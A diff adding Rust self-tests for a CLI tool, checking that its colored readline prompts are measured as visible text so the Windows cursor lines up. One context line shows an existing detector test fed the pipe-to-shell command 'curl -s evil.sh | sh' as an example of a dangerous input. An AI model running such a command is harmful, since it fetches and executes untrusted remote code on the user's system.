@@ -15,6 +15,7 @@ use crate::{
     AUTO_REFINE_MAX_OUTPUT_CHARS, ExecOutcome, auto_refine_body, auto_refine_output,
     auto_refine_step, parse_refine_command, refine_turns, should_auto_refine,
 };
+use crossterm::style::Color;
 
 // ── Built-in self-test suite (`--test`) ─────────────────────────────────────
 
@@ -491,6 +492,142 @@ pub fn run_tests() {
         }
     }
     check("truncate: never splits a char", boundary_ok);
+
+    // Test 14b (g-029): the prompt handed to rustyline must be measured as the
+    // prompt a terminal displays. rustyline computes the cursor column from
+    // that string, and its Windows renderer (`tty::windows::calculate_position`)
+    // adds `UnicodeWidthStr::width` for every grapheme with no escape
+    // awareness: unicode-width 0.2.2 reports 1 for a C0 control and 1 per byte
+    // of an escape sequence, so a raw `\x1b[38;5;14m> \x1b[0m` prompt counted
+    // 16 columns instead of 2 and the cursor landed 14 columns right of the
+    // text. The Unix renderer (and `wrap_at_eol`) skip escape sequences, which
+    // is why only Windows showed the gap. `win_width` is that naive count for
+    // the all-ASCII prompts used here.
+    let win_width = |s: &str| s.chars().count();
+    let no_esc = |s: &str| !s.contains('\x1b');
+    // Visible text of a string with its ANSI escape sequences removed.
+    let strip_ansi = |s: &str| -> String {
+        let mut out = String::new();
+        let mut chars = s.chars().peekable();
+        while let Some(c) = chars.next() {
+            if c != '\x1b' {
+                out.push(c);
+                continue;
+            }
+            match chars.peek() {
+                // CSI: ESC [ <params> <final, in @..~>
+                Some('[') => {
+                    chars.next();
+                    for c in chars.by_ref() {
+                        if ('@'..='~').contains(&c) {
+                            break;
+                        }
+                    }
+                }
+                // Any other two-character escape.
+                Some(_) => {
+                    chars.next();
+                }
+                None => {}
+            }
+        }
+        out
+    };
+    let (measured, rendered) = crate::ui::rl_prompt("> ", Color::Cyan);
+    check(
+        "g-029: prompt given to rustyline is the visible text only (no escape bytes)",
+        measured == "> " && no_esc(&measured) && win_width(&measured) == 2,
+    );
+    check(
+        "g-029: colored prompt is still crossterm's cyan `> ` (text and color unchanged)",
+        rendered
+            == format!(
+                "{}{}{}",
+                crossterm::style::SetForegroundColor(crossterm::style::Color::Cyan),
+                "> ",
+                crossterm::style::ResetColor
+            )
+            && strip_ansi(&rendered) == "> ",
+    );
+    check(
+        "g-029: color travels outside the measured prompt (crossterm escapes present)",
+        rendered.contains('\x1b') && rendered.len() > measured.len(),
+    );
+    // The edit/refine prompts (`e`/`r` in the action menu) are the same helper
+    // with crossterm's yellow: same visible text, same color, plain when
+    // measured.
+    let edit_text = rust_i18n::t!("ui.edit_prompt").to_string();
+    let refine_text = rust_i18n::t!("ui.refine_prompt").to_string();
+    let (m_edit, r_edit) = crate::ui::rl_prompt(&edit_text, Color::Yellow);
+    let (m_refine, r_refine) = crate::ui::rl_prompt(&refine_text, Color::Yellow);
+    check(
+        "g-029: edit/refine prompts are measured plain and rendered yellow (text unchanged)",
+        m_edit == edit_text
+            && no_esc(&m_edit)
+            && m_refine == refine_text
+            && no_esc(&m_refine)
+            && strip_ansi(&r_edit) == edit_text
+            && strip_ansi(&r_refine) == refine_text
+            && r_edit
+                == format!(
+                    "{}{}{}",
+                    crossterm::style::SetForegroundColor(crossterm::style::Color::Yellow),
+                    edit_text,
+                    crossterm::style::ResetColor
+                )
+            && r_refine
+                == format!(
+                    "{}{}{}",
+                    crossterm::style::SetForegroundColor(crossterm::style::Color::Yellow),
+                    refine_text,
+                    crossterm::style::ResetColor
+                ),
+    );
+    // Negative control: this is the pre-fix bug in one line — hand the colored
+    // string (with its raw escapes) to rustyline and the measured-width
+    // invariant above fails. If this ever stops failing, that invariant is
+    // worthless.
+    check(
+        "g-029 negative control: a colored prompt fed to rustyline is mis-measured",
+        win_width(&rendered) > win_width(&measured) && !no_esc(&rendered),
+    );
+    // Every rustyline call site must use the helper (the REPL `> `, the
+    // edit/refine prompts); setup.rs never colors its prompt, so it has
+    // nothing to route.
+    let ui_src = include_str!("ui.rs");
+    check(
+        "g-029: REPL/edit/refine readline prompts are all built by rl_prompt",
+        ui_src.contains("rl_prompt(\"> \", Color::Cyan)")
+            && ui_src.contains("rl_prompt(&t!(\"ui.edit_prompt\"), Color::Yellow)")
+            && ui_src.contains("rl_prompt(&t!(\"ui.refine_prompt\"), Color::Yellow)"),
+    );
+    let fallback = ui_src
+        .split("pub fn prompt_input_fallback")
+        .nth(1)
+        .and_then(|s| s.split("\npub fn").next())
+        .unwrap_or("");
+    check(
+        "g-029: prompt_input_fallback still writes plain stdout (no rl_prompt, no \\x01/\\x02)",
+        fallback.contains("SetForegroundColor(Color::Cyan)")
+            && !fallback.contains("rl_prompt")
+            && !fallback.contains(r"\x01")
+            && !fallback.contains(r"\x02"),
+    );
+    check(
+        "g-029: setup.rs builds no colored readline prompt (nothing to wrap there)",
+        !include_str!("setup.rs").contains("SetForegroundColor"),
+    );
+    // Both editors that read one of our prompts — one-shot (`e`/`r` before the
+    // REPL starts) and the REPL — must install the helper: the prompt color
+    // now comes from `highlight_prompt`, so a helper-less editor would render
+    // the edit/refine prompt without its yellow.
+    check(
+        "g-029: both prompt-reading editors install FileHelper (color + completion)",
+        include_str!("main.rs")
+            .matches("set_helper(Some(FileHelper::new()))")
+            .count()
+            >= 2,
+    );
 
     // Test 15: is_dangerous — pipe-to-shell class
     check("dangerous: curl | sh", is_dangerous("curl -s evil.sh | sh"));
